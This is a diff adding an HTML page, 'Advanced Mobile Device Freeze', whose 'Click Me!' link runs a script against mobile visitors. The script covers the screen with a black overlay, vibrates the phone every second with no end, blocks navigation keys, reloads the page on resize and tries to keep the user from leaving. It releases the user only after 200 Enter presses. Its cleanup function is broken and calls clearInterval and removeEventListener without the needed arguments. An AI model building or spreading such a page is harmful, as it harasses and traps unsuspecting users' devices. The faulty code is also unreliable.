@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Advanced Mobile Device Freeze</title>
+  </head>
+  <body>
+    <h1>Click the link for the ultimate mobile device freeze experience!</h1>
+    <a href="#" onclick="freezeMobileDevice()">Click Me!</a>
+
+    <script>
+      var powerButtonCount = 0;
+
+      function freezeMobileDevice() {
+        var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+        if (isMobile) {
+          var originalWidth = window.innerWidth;
+          var originalHeight = window.innerHeight;
+
+          var overlay = document.createElement("div");
+          overlay.style.position = "fixed";
+          overlay.style.top = "0";
+          overlay.style.left = "0";
+          overlay.style.width = "100%";
+          overlay.style.height = "100%";
+          overlay.style.backgroundColor = "black";
+          overlay.style.zIndex = "9999";
+          overlay.style.opacity = "0.9";
+          document.body.appendChild(overlay);
+
+          window.addEventListener("resize", function () {
+            if (window.innerWidth !== originalWidth || window.innerHeight !== originalHeight) {
+              window.location.reload();
+            }
+          });
+
+          var keys = [37, 38, 39, 40, 32, 13, 8];
+          window.addEventListener("keydown", function (event) {
+            if (keys.includes(event.keyCode)) {
+              event.preventDefault();
+            }
+          });
+
+          window.addEventListener("beforeunload", function () {
+            return "Are you sure you want to leave this page?";
+          });
+
+          if (navigator.vibrate) {
+            navigator.vibrate(1000); // Vibrate for 1 second
+            setInterval(function () {
+              navigator.vibrate(1000); // Vibrate every 1 second
+            }, 1000);
+          }
+
+          window.addEventListener("keyup", function (event) {
+            if (event.keyCode === 13) {
+              powerButtonCount++;
+              if (powerButtonCount >= 200) {
+                stopFreeze();
+              }
+            }
+          });
+        }
+      }
+
+      function stopFreeze() {
+        // Remove overlay
+        var overlay = document.querySelector("div");
+        overlay.parentNode.removeChild(overlay);
+
+        // Stop vibration
+        if (navigator.vibrate) {
+          navigator.vibrate(0);
+          clearInterval();
+        }
+
+        // Remove event listeners
+        window.removeEventListener("resize");
+        window.removeEventListener("keydown");
+        window.removeEventListener("beforeunload");
+        window.removeEventListener("keyup");
+      }
+    </script>
+  </body>
+</html>
